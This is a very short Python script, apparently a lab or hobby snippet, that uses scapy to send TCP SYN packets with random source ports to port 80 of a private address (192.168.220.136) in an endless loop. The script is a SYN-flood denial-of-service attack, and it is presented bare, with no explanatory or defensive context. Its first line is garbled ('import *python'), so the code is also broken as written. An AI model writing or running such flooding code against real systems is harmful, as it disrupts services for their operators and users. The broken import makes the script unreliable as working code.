from scapy.all import *python
p=IP(dst='192.168.220.136')/TCP(flags="S",  sport=RandShort(),  dport=int(80))
send(p,  verbose=0, loop=1)
print ("opps")
